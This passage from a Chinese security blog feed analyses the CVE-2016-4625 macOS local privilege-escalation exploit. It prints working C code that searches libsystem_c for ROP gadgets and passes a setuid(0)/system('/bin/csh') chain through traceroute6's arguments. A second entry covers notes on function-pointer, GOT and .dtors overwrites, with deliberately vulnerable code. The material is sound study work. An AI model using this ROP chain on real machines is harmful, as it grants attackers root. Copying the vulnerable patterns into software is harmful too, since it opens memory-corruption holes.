class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>** <span class="title">setup_payload_and_offsets</span><span class="params">(<span class="keyword">uint64_t</span>* stack_shift, <span class="keyword">uint64_t</span>* fptr_page, <span class="keyword">uint32_t</span>* fptr_offset)</span> </span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">// &amp;__cleanup: __DATA 段中 __cleanup 的地址</span></div><div class="line">   <span class="comment">// __cleanup : 是 libsystem_c.dylib 中对应函数的地址</span></div><div class="line">  *fptr_page = (<span class="keyword">uint64_t</span>)((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)(&amp;__cleanup) &amp; ~(<span class="number">0xfff</span>ULL));        [<span class="number">0</span>] 代码段内存共享，所以各个进程中__cleanup地址都一样</div><div class="line">  *fptr_offset = ((<span class="keyword">uint64_t</span>)(&amp;__cleanup)) - *fptr_page;</div><div class="line"></div><div class="line">  <span class="comment">//[1] 搜索 ret 指令</span></div><div class="line">  <span class="keyword">uint8_t</span>* ret = (<span class="keyword">uint8_t</span>*)&amp;<span class="built_in">strcpy</span>; <span class="comment">// the start of libsystem_c</span></div><div class="line">  <span class="keyword">do</span> &#123;</div><div class="line">    ret += <span class="number">1</span>;</div><div class="line">    ret = memmem(ret, <span class="number">0x1000000</span>, <span class="string">"\xc3"</span>, <span class="number">1</span>);   <span class="comment">//search 'ret'</span></div><div class="line">  &#125; <span class="keyword">while</span> (ret != <span class="literal">NULL</span> &amp;&amp; ((count_nulls((<span class="keyword">uint64_t</span>)ret)) != <span class="number">2</span>) );</div><div class="line">..</div><div class="line">  <span class="comment">//[2]. pop rdi; ret gadget</span></div><div class="line">  <span class="keyword">uint8_t</span>* pop_rdi_ret = memmem(&amp;<span class="built_in">strcpy</span>, <span class="number">0x1000000</span>, <span class="string">"\x5f\xc3"</span>, <span class="number">2</span>);</div><div class="line">  <span class="keyword">if</span> (pop_rdi_ret == <span class="literal">NULL</span>) &#123;</div><div class="line">    FAIL(<span class="string">"couldn't find pop rdi; ret gadget\n"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//[3]. /bin/sh string:</span></div><div class="line">  <span class="keyword">void</span>* bin_sh = ((<span class="keyword">char</span>*)__cleanup)-(<span class="number">1024</span>*<span class="number">1024</span>); <span class="comment">// start from 1MB below this symbol in libsystem_c.dylib</span></div><div class="line">  bin_sh = memmem(bin_sh, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>, <span class="string">"/bin/csh"</span>, <span class="number">9</span>);</div><div class="line">  <span class="keyword">if</span> (bin_sh == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find /bin/sh string\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//[4]. 搜索 修改 rsp 的 gadget</span></div><div class="line"></div><div class="line"><span class="keyword">uint8_t</span>* stack_shift_gadget = memmem(&amp;realpath, <span class="number">0x4000</span>, <span class="string">"\x48\x81\xc4"</span>, <span class="number">3</span>);</div><div class="line">  <span class="keyword">if</span> (stack_shift == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find stack shift\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="comment">// libsystem_c.dylib`realpath$DARWIN_EXTSN:</span></div><div class="line"><span class="comment">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp             ; imm = 0x1D98</span></div><div class="line"><span class="comment">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</span></div><div class="line"><span class="comment">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</span></div><div class="line"><span class="comment">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</span></div><div class="line"><span class="comment">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</span></div><div class="line"><span class="comment">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</span></div><div class="line"><span class="comment">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</span></div><div class="line"><span class="comment">// 0x7fffa333ab58 &lt;+1925&gt;: retq</span></div><div class="line"></div><div class="line">  <span class="comment">//获取 add rsp 的立即数</span></div><div class="line">  <span class="keyword">uint32_t</span> realpath_shift_amount = *(<span class="keyword">uint32_t</span>*)(stack_shift_gadget+<span class="number">3</span>);  <span class="comment">//0x1d98 </span></div><div class="line"></div><div class="line">  <span class="comment">// 这里预测 traceroute6 的栈大小</span></div><div class="line">  <span class="keyword">uint32_t</span> traceroute6_stack_size = <span class="number">0x948</span>;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (realpath_shift_amount - <span class="number">0x200</span> &lt; traceroute6_stack_size) &#123;</div><div class="line">    <span class="comment">//add rsp, xxx  这个值不够大，无法跳转到 argv 区</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"that stack shift gadget probably isn't big enough...\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line">    </div><div class="line">  *stack_shift = (<span class="keyword">uint64_t</span>)stack_shift_gadget;</div><div class="line"></div><div class="line"><span class="keyword">int</span> ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / <span class="number">8</span> / <span class="number">5</span>) * <span class="number">2</span>;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">char</span>* progname = <span class="string">"/usr/sbi"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"n/tracer"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"oute6"</span>;   <span class="comment">//6</span></div><div class="line">  <span class="keyword">char</span>* optname  = <span class="string">"-w"</span>;      <span class="comment">//3</span></div><div class="line">  <span class="keyword">char</span>* optval   = <span class="string">"LOLLLL"</span>;  <span class="comment">//7</span></div><div class="line"></div><div class="line"><span class="comment">// 这里 『+6』 是因为 ret slide 后面 还有 pop_rdi_ret 到&amp;system 6条指令。</span></div><div class="line">  <span class="keyword">size_t</span> target_argv_rop_size = (ret_slide_length + <span class="number">6</span>)* <span class="number">8</span>; <span class="comment">// ret slides plus slots for the actual rop</span></div><div class="line"></div><div class="line">  <span class="keyword">uint8_t</span>** args_u64 = <span class="built_in">malloc</span>(target_argv_rop_size + <span class="number">1</span>); <span class="comment">// plus extra NULL byte at the end</span></div><div class="line">  <span class="keyword">char</span>* args = (<span class="keyword">char</span>*)args_u64;</div><div class="line">  <span class="built_in">memset</span>(args, <span class="number">0</span>, target_argv_rop_size + <span class="number">1</span>);</div><div class="line"></div><div class="line">  <span class="comment">// ret-slide  写入堆中</span></div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</div><div class="line">    args_u64[i] = ret;</div><div class="line">  &#125;</div><div class="line">【<span class="number">0</span>】 提权的 shellcode</div><div class="line">  args_u64[i] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">  args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</div><div class="line">  args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">4</span>] = bin_sh;</div><div class="line">  args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</div><div class="line"></div><div class="line">  <span class="comment">// allocate worst-case size</span></div><div class="line">   <span class="comment">// malloc 足够大的空间来保存 shellcode </span></div><div class="line">  <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</div><div class="line">  <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</div><div class="line">  <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</div><div class="line"><span class="comment">// 【1】 设置启动参数 /usr/sbin/traceroute6 -w  LOLLLL</span></div><div class="line">  target_argv[<span class="number">0</span>] = progname;</div><div class="line">  target_argv[<span class="number">1</span>] = optname;</div><div class="line">  target_argv[<span class="number">2</span>] = optval;</div><div class="line">  <span class="keyword">int</span> argn = <span class="number">3</span>;</div><div class="line"></div><div class="line">  <span class="comment">//【2】将 ret 数组的地址写入到 argv 中</span></div><div class="line">  target_argv[argn++] = &amp;args[<span class="number">0</span>];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    <span class="keyword">if</span> (args[i<span class="number">-1</span>] == <span class="number">0</span>) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  target_argv[argn] = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> target_argv;</div></pre></td></tr></table></figure>
<p>【1】设置 traceroute6 的错误参数<br>【1】处的参数执行完以后给 parent 足够的时间来将 目标进程中 DATA段中__cleanup 函数指针覆盖为 一段gadget 的地址（此时shellcode 的地址还不能确定）, 就是步骤<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a>中找到的 gadget 的地址。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp        </div><div class="line">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</div><div class="line">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</div><div class="line">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</div><div class="line">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</div><div class="line">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</div><div class="line">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</div><div class="line">// 0x7fffa333ab58 &lt;+1925&gt;: retq</div></pre></td></tr></table></figure></p>
<p>这里 作者预测了tracerouter6 的栈帧长度是 0x948，</p>
<p>【2】处将 ret slide 拷贝到 argv s 参数列表。<br>在调试的过程中发现 x86-64位机器系统库加载的地址从0x00007fff000000000开始偏移小余4G，所以所有 gadget 指令地址都包含2个NULL字节，因为argvs 默认以 NULL 字符结尾所以第二个 NULL 会被认为没有参数了，这样就无法在栈上喷射大量的 ret指令。这里通过使用2个参数指针来指向一个 ret 地址的方法来解决这个问题。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">target_argv<span class="string">[argn++]</span> = &amp;args<span class="string">[0]</span>;</div><div class="line">  for(int i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    if (args<span class="string">[i-1]</span> == <span class="number">0</span>) &#123;</div><div class="line">      target_argv<span class="string">[argn++]</span> = &amp;args<span class="string">[i]</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>这段代码实现了将 shellcode 内存地址 传递给 argv 指针，同时为了防止出现连续2个 null 字节的情况，将2个连续的 null字节（第二个）保存到了2个 argv 指针中。<br>说明：这段实现要提前检查 ret 地址中 null 字节的个数，null 字节不能超过2个否则 ret地址会被截断。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">count_nulls</span><span class="params">(<span class="keyword">uint64_t</span> val)</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> nulls = <span class="number">0</span>;</div><div class="line">  <span class="keyword">uint8_t</span>* bytes = (<span class="keyword">uint8_t</span>*)&amp;val;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</div><div class="line">    <span class="keyword">if</span> (bytes[i] == <span class="number">0</span>) &#123;</div><div class="line">      nulls++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> nulls;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>【0】这里是提权的 shellcode， 先将自生uid 设置成 root 用户，然后开启一个终端这个终端默认是 root 用户并且不能自动降低权限。<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">setuid(<span class="number">0</span>)<span class="comment">;  //将当前进程设置为 root</span></div><div class="line">    pop rdi   <span class="comment">; 参数 为0</span></div><div class="line">    ret       <span class="comment">; setuid</span></div><div class="line"></div><div class="line">system(“/bin/csh”)<span class="comment">;</span></div><div class="line">    pop rdi   <span class="comment">; 参数 为’/bin/csh’</span></div><div class="line">    ret       <span class="comment">; system</span></div></pre></td></tr></table></figure></p>
<p>最后来张图看下内存布局<br><img src="/include/img/4625/gadget_shellcode.jpg" alt="gadget_shellcode"></p>
<h4 id="漏洞补丁："><a href="#漏洞补丁：" class="headerlink" title="漏洞补丁："></a>漏洞补丁：</h4><p>OS X El Capitan v10.11.6 and Security Update 2016-004 </p>
<h3 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h3><p>  本文还有一些内容没有介绍，其中一些我也不清楚有些只知道皮毛。列举几个问题和待完善的地方：</p>
<ul>
<li>IOSurfaceRootUserClient 创建共享内存原语的2个函数，应该逆向分析下原理帮助定位 shellcode，同时 port IPC通信也需要分析。</li>
<li>代码中计算ret_slide_length 时候为什么要除5？</li>
<li>分析完整个 exploit 再回看漏洞本身，感觉提权的部分和漏洞的关系貌似不大；如果我在第一个创建的子进程中启动 traceroute6（先进行 port dancer 传递 child task port）,是否父进程也可以共享 tracerouter6的内存空间，如果可以后面的工作就是一样的了应该也可以提权。 这个想法有待尝试，但是失败的可能性是80% 猜测可能有权限的限制（比如系统检测到 tracerrouter6是 root用户的进程不允许普通用户共享内存）。</li>
<li>还有就是资料中用 IDA反编译 IOSurface.text 时怎么获取的结构体信息，这个模块是没有源代码的，有什么逆向的技巧吗？</li>
</ul>
<h4 id="CVE-2016-4625-的前途："><a href="#CVE-2016-4625-的前途：" class="headerlink" title="CVE-2016-4625 的前途："></a>CVE-2016-4625 的前途：</h4><p>由于除了root以外，这个bug也允许我们获得其他任何权限，所以很容易利用它来绕过OS X上的内核代码签名，并加载一个未签名的内核扩展<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试机：Mac Mini<br>系统版本：OS X EI capitan 10.11.2</p>
<p><img src="/include/img/4625/test.jpg" alt="test"></p>
<h3 id="snippet"><a href="#snippet" class="headerlink" title="snippet"></a>snippet</h3><p>…</p>
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-03-06</td>
<td>debug exp</td>
</tr>
<tr>
<td>2017-03-07</td>
<td>write blogs</td>
</tr>
</tbody>
</table>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://bbs.pediy.com/thread-215839.htm" target="_blank" rel="external">译文</a><br><a href="https://googleprojectzero.blogspot.kr/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">原文</a><br><a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">CVE-2016-1757的Exploit — Patching kextload</a><br><a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">再看CVE-2016-1757浅析mach%20message的使用</a><br><a href="http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/" target="_blank" rel="external">调试 CVE-2016-4625 exploit </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;(本人第一次接触 OSX 系统，这篇文章对我来说难度还是比较大的，本人水平有限文章难免有错，请路过的大牛多多指点，轻拍)&lt;/p&gt;
&lt;p&gt;本文是为分析 yalu102越狱工具做铺垫，这个漏洞并没有在 yalu越狱中被使用，因为这个漏洞是 macOS 中的。&lt;br&gt;分析本文是为了学习 XNU 中 task 结构体存在的分险并且结合 port 来实现提权的原理。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="熟悉" scheme="http://yoursite.com/tags/%E7%86%9F%E6%82%89/"/>
    
      <category term="ios/osx" scheme="http://yoursite.com/tags/ios-osx/"/>
    
  </entry>
  
  <entry>
    <title>漏洞基础--内存漏洞</title>
    <link href="http://yoursite.com/2017/02/28/%E5%86%85%E5%AD%98%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/02/28/内存漏洞/</id>
    <published>2017-02-28T05:07:08.000Z</published>
    <updated>2017-03-09T16:31:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>《C++ 安全编程》 – 第 三 章：指针诡计<br><a id="more"></a></p>
</blockquote>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>本章介绍内存漏洞，如何达到 劫持控制流 和 任意内存地址写。<br>两个典型的例子：</p>
<ul>
<li>覆盖函数指针：通过溢出操作，覆盖内存中的函数指针指向攻击者的 shellcode，达到劫持控制流的目的。如果是内核中劫持控制流应为有 PXN 的限制不能直接从内核跳转到用户态执行，所以需要 ROP 或者其他手段配合使用。（绕过 PXN 不属于本文介绍内容）</li>
<li>修改指针对象：如果一个指针对象作为后继赋值操作的目的地址，那么攻击者就可以通过控制指针对象达到任意地址写。</li>
</ul>
<p>学习这部分内容，前置的知识是要 知道程序中的数据，指令在内存中的位置，所处的环境（内核、用户态）。</p>
<p>数据包括：局部变量、参数、返回值、函数指针、全局变量、静态变量、类对象、类的成员、类的虚表 等等。<br>指令包括：用户代码、动态库、静态库、中断代码、系统调用、驱动+内核代码</p>
<p>列表：</p>
<ol>
<li>函数指针</li>
<li>对象指针</li>
<li>修改指令指针</li>
<li>全局偏移表 GOT</li>
<li>.dtors 区</li>
<li>虚指针</li>
<li>longjmp 函数</li>
</ol>
<h3 id="函数指针安全-–-缓冲区溢出-控制流"><a href="#函数指针安全-–-缓冲区溢出-控制流" class="headerlink" title="函数指针安全 – 缓冲区溢出/控制流"></a>函数指针安全 – 缓冲区溢出/控制流</h3><blockquote>
<p>3.2 函数指针</p>
</blockquote>
<h4 id="Case"><a href="#Case" class="headerlink" title="Case"></a>Case</h4><p>BSS段中的缓冲区溢出<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">good_function</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;...&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buff[BUFFERSIZE];</div><div class="line">    <span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>;</div><div class="line">    funcPtr = &amp;good_function;</div><div class="line">    srncpy(buff, argv[<span class="number">1</span>], <span class="built_in">strlen</span>(argv[<span class="number">1</span>]));   <span class="comment">// 有可能覆盖 funcPtr</span></div><div class="line">    (<span class="keyword">void</span>)(*funcPtr)(argv[<span class="number">2</span>]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="对象指针-–-任意地址写-控制流"><a href="#对象指针-–-任意地址写-控制流" class="headerlink" title="对象指针 – 任意地址写/控制流"></a>对象指针 – 任意地址写/控制流</h3><blockquote>
<p>3.3</p>
</blockquote>
<p>任意地址写任意数据<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">void</span> * arg, <span class="keyword">size_t</span> len)</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">100</span>];</div><div class="line">    <span class="keyword">long</span> val = ..;</div><div class="line">    <span class="keyword">long</span> * ptr = ...;</div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(buff, arg, len);</div><div class="line">    *ptr = val;</div><div class="line">    ..</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>注意：类型长度， x86-32位系统中 void* ，int， long都是 4字节</p>
<h3 id="修改指令指针"><a href="#修改指令指针" class="headerlink" title="修改指令指针"></a>修改指令指针</h3><p>x86-32 架构，指令指针寄存器 eip，不可以直接修改。必须通过控制转移指令（jmp, jcc, call 和 ret等），中断，异常 间接修改。<br>(貌似 arm 上可以直接修改??)</p>
<p>分析 call 指令：</p>
<ol>
<li>将返回值存储到栈中</li>
<li>将控制权转到目标操作数 （立即数，通用寄存器，内存地址）</li>
</ol>
<h4 id="Case-1"><a href="#Case-1" class="headerlink" title="Case"></a>Case</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">good_function</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, str);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*funcPtr)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span></span>;</div><div class="line">    funcPtr = &amp;good_function;</div><div class="line">    (<span class="keyword">void</span>)(*funcPtr)(<span class="string">"hi \n"</span>);      【<span class="number">1</span>】</div><div class="line">    good_function(<span class="string">"there!\n"</span>);      【<span class="number">2</span>】</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">x86 汇编</div><div class="line">_main   PROC</div><div class="line">        push     ebp</div><div class="line">        mov      ebp, esp</div><div class="line">        mov      DWORD PTR good_function OFFSET ?good_function@@YAXPBD@Z</div><div class="line">        <span class="comment">//[1]</span></div><div class="line">        push     OFFSET $SG5338</div><div class="line">        call     DWORD PTR ?funcPtr@?<span class="number">1</span>??main@@<span class="number">9</span>@<span class="number">4</span>P6AXPBD@ZA</div><div class="line">        add      esp, <span class="number">4</span></div><div class="line"></div><div class="line">        <span class="comment">//[2]</span></div><div class="line">        push     OFFSET $SG5339</div><div class="line">        call     good_function</div><div class="line">        add      esp, <span class="number">4</span></div><div class="line">        xor      eax, eax</div><div class="line">        pop      ebp</div><div class="line">        ret      <span class="number">0</span></div><div class="line">_main   ENDP</div><div class="line"></div><div class="line">good_function PROC</div><div class="line">        push     ebp</div><div class="line">        mov      ebp, esp</div><div class="line">        mov      eax, DWORD PTR _str$[ebp]</div><div class="line">        push     eax</div><div class="line">        push     OFFSET $SG5329</div><div class="line">        call     _printf</div><div class="line">        add      esp, <span class="number">8</span></div><div class="line">        pop      ebp</div><div class="line">        ret      <span class="number">0</span></div><div class="line">good_function ENDP</div></pre></td></tr></table></figure>
<h3 id="全局偏移表-GOT-–-任意地址写-控制流"><a href="#全局偏移表-GOT-–-任意地址写-控制流" class="headerlink" title="全局偏移表 GOT – 任意地址写/控制流"></a>全局偏移表 GOT – 任意地址写/控制流</h3><p>任何 ELF 的二进制文件的进程空间中，都包含一个GOT 表。GOT 存放绝对地址，地址是有效的并且不影响 PIC/PIE。改变的内容和形式取决于处理器型号。</p>
<p>程序首次使用一个外部模块的函数之前，先要跳入 plt中调用 _dl_runtime_resolve 函数完成符号解析和重定位，将函数的绝对地址写入对应的 GOT 表项。再次执行次函数时，就从 GOT 表中执行绝对地址。</p>
<p>在函数中调用重定位函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">blx    func   ; 套转到 func@plt 中</div><div class="line">...</div><div class="line"></div><div class="line">PTL0:</div><div class="line">    push *(GOT+4) //保存的是当前模块的ID</div><div class="line">    jump *(GOT+8) //跳转到 _dl_runtime_resolve()完成符号解析和重定位</div><div class="line">......</div><div class="line">func@plt:</div><div class="line">    jmp *(func@GOT)     // 第一次 GOT 表项会跳转到下移行执行</div><div class="line">    push n      //对应 GOT 表中 func 函数的索引</div><div class="line">    jmp PLT0</div></pre></td></tr></table></figure></p>
<p>攻击者可以利用，任意地址写漏洞覆盖 GOT 表中的函数地址为 shellcode 地址。<br>这一类攻击主要在用户态被使用。<br>一般C 程序最后都会调用 exit()函数，所以我们经常覆盖 exit 的 GOT 入口项。</p>
<h4 id="Case-2"><a href="#Case-2" class="headerlink" title="Case"></a>Case</h4><h3 id="dtors-区-–-任意地址写-控制流"><a href="#dtors-区-–-任意地址写-控制流" class="headerlink" title=".dtors 区  – 任意地址写/控制流"></a>.dtors 区  – 任意地址写/控制流</h3><p>任意内存写覆盖 GCC 生成的可执行文件中.dtors 区中函数指针。</p>
<p>GNU C 允许程序员利用<strong>attribute</strong>关键字给函数添加属性。属性包括constructor和 destructor。<br>constructor 在 main之前执行，在.ctors 区中。<br>destructor 在 exit之后执行，在 dtors 区中。<br>因为 constructor中的函数在 main 前执行完一次就不再执行，所以漏洞利用只考虑覆盖 destructor 中的函数指针。</p>
<p>.dtors 区是可写的（不可写可以用 mprotect函数修改 prot）。其内容的格式：<br>0xffff ffff {函数地址1，函数地址2.、、} 0x0000 0x0000</p>
<p>如果没有执行析构函数，.dtors 区中中包含头、尾标签而中间没有函数地址，一样可以将尾（0x0000 0000）覆盖为 shellcode 的地址。</p>
<p><a href="http://blog.csdn.net/pillarbuaa/article/details/7800801" target="_blank" rel="external">通过覆盖.dtors进行缓冲区溢出攻击</a></p>
